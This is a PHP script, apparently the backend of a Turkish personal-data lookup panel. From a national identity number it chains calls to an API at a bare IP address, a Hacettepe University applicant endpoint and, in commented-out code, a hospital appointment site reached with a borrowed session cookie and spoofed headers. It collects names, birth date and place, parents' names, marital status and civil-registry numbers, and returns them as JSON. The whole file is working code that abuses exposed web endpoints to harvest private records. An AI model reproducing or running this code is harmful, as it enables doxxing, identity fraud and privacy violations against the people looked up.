<?php

ini_set("display_errors", 0);
error_reporting(0);

include "../../server/authcontrol.php";

include "../../server/baglan.php";

function getPatientInformation($session, $tc, $code)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://online.corluvatan.com/randevu/get_patient_info.php?fr_identity_no=$tc&fr_secure_code=$code");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$session");
    //headers
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Accept: */*',
        'Origin: http://online.corluvatan.com',
        'X-Requested-With: XMLHttpRequest',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Referer: http://online.corluvatan.com/randevu/patient_information.php',
        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie: PHPSESSID=' . $session
    ));
    $result = curl_exec($ch);
    return $result;
}

function getPatientPage($session)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://online.corluvatan.com/randevu/new_patient_register.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$session");
    //headers
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Accept: */*',
        'Origin: http://online.corluvatan.com',
        'X-Requested-With: XMLHttpRequest',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Referer: http://online.corluvatan.com/randevu/new_patient_register.php',
        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie: PHPSESSID=' . $session
    ));
    $result = curl_exec($ch);

    // create DOM from the HTML
    $dom = new DOMDocument();
    $dom->loadHTML($result);

    // get value attribute of input with id contains ="fr"
    $xpath = new DOMXPath($dom);
    $fr_name = $xpath->query("//input[@id='fr_name']")->item(0)->getAttribute('value');
    $fr_surname = $xpath->query("//input[@id='fr_surname']")->item(0)->getAttribute('value');
    $fr_sex = $xpath->query("//input[@id='fr_sexuality_view']")->item(0)->getAttribute('value');
    $fr_birth = $xpath->query("//input[@id='fr_birth_date']")->item(0)->getAttribute('value');
    $fr_father = $xpath->query("//input[@id='fr_father_name']")->item(0)->getAttribute('value');
    $fr_mother = $xpath->query("//input[@id='fr_mother_name']")->item(0)->getAttribute('value');

    if (str_contains($fr_name, "Undefined index: NAME")) {
        return array(
            'success' => "false",
            'message' => "captcha"
        );
    } else {
        return array(
            'success' => "true",
            'name' => $fr_name,
            'surname' => $fr_surname,
            'sex' => $fr_sex,
            'birth' => $fr_birth,
            'father' => $fr_father,
            'mother' => $fr_mother,
        );
    }
}

function Capture($str, $starting_word, $ending_word)
{
    $subtring_start  = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return substr($str, $subtring_start, $size);
};

function hsys($tc)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://78.135.87.16/wizort/api/hsys/api.php?tc=$tc&method=kisi");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function hacettepe($tc, $ad, $soyad, $dogumtarihi)
{
    $dogumtarihiarray = explode(".", $dogumtarihi);
    $dogumtarihi = $dogumtarihiarray[0] . "/" . $dogumtarihiarray[1] . "/" . $dogumtarihiarray[2];

    $array = array();
    $array["yerli_kimlik_tc_kimlik_no"] = $tc;
    $array["aday_ad"] = $ad;
    $array["aday_soyad"] = $soyad;
    $array["yerli_kimlik_dogum_tarih"] = $dogumtarihi;
    $query = http_build_query($array);

    $url = "https://enstitu.hacettepe.edu.tr/aday/crud!bilgiGetir.action?" . $query;
    $agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "ayricalik=ad%2Csoyad%2Cbaba_adi%2Cana_adi%2Cmahalle%2Cmedeni_hal%2Ccinsiyet%2Cdogum_tarih%2Ccilt_no%2Caile_sira_no%2Csira_no%2Cdogum_yer%2Cil_pk%2Cil_ad%2Cilce_pk%2Cilce_ad");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
    $curl_scraped_page = curl_exec($ch);
    $error = '{"adayList":[],"total":0,"aday_pk":1,"success":true}';
    $error1 = '{"success":"hata"}';
    $error2 = false;
    if ($curl_scraped_page === $error or $curl_scraped_page === $error1 or $curl_scraped_page === $error2) {
        return ["success" => "false", "message" => "person not found"];
    } else {
        $bilgi = json_decode($curl_scraped_page, true);
        $bilgi = $bilgi["adayList"][0];
        $medeni = '';
        $cinsiyet = '';
        switch ($bilgi['medeni_hal']) {
            case '1':
                $medeni = 'BEKAR';
                break;
            case '0':
                $medeni = 'EVLI';
                break;
            case '2':
                $medeni = 'EVLI';
                break;
            default:
                $medeni = "YOK";
                break;
        }
        switch ($bilgi['cinsiyet']) {
            case '1':
                $cinsiyet = 'ERKEK';
                break;
            case '0':
                $cinsiyet = 'KADIN';
                break;
            case '2':
                $cinsiyet = 'KADIN';
                break;
            default:
                $cinsiyet = "YOK";
                break;
        }
        $details = array(
            "success" => "true",
            "baba_adi" => $bilgi["baba_adi"],
            "anne_adi" => $bilgi["ana_adi"],
            "nufus_mahalle" => $bilgi["mahalle"],
            "medeni_hali" => $medeni,
            "cinsiyet" => $cinsiyet,
            "cilt_no" => $bilgi["cilt_no"],
            "aile_sira_no" => $bilgi["aile_sira_no"],
            "sira_no" => $bilgi["sira_no"],
            "dogum_yeri" => $bilgi["dogum_yer"],
            "nufus_il" => $bilgi["il_ad"],
            "nufus_ilce" => $bilgi["ilce_ad"]
        );
        return $details;
    }
    curl_close($ch);
}

#getPatientInformation(htmlspecialchars($_POST['session']), htmlspecialchars($_POST['tc']), htmlspecialchars($_POST['code']));
#$first_details = getPatientPage(htmlspecialchars($_POST['session']));
$first_details = hsys(htmlspecialchars($_POST["tc"]));
$first_details = json_decode($first_details, true)["person"];

if (!empty($first_details["ad"])) {
    $hacettepe = hacettepe(htmlspecialchars($_POST["tc"]), $first_details['ad'], $first_details['soyad'], $first_details['dogumTarihi']);

    $data = array(
        "success" => "true",
        "ad" => $first_details['ad'],
        "soyad" => $first_details['soyad'],
        "dogumtarih" => $first_details['dogumTarihi'],
        "cinsiyet" => $hacettepe['cinsiyet'],
        "dogumyer" => $hacettepe["dogum_yeri"],
        "medenihal" => $hacettepe["medeni_hali"],
        "annead" => $hacettepe['anne_adi'],
        "babaad" => $hacettepe['baba_adi'],
        "nufusil" => $hacettepe["nufus_il"],
        "nufusilce" => $hacettepe["nufus_ilce"],
        "nufusmahalle" => $hacettepe["nufus_mahalle"],
        "ciltno" => $hacettepe["cilt_no"],
        "sirano" => $hacettepe["sira_no"],
        "ailesirano" => $hacettepe["aile_sira_no"]
    );
    echo json_encode($data);
} else {
    $data = array('success' => 'false', 'message' => "captcha");
    echo json_encode($data);
}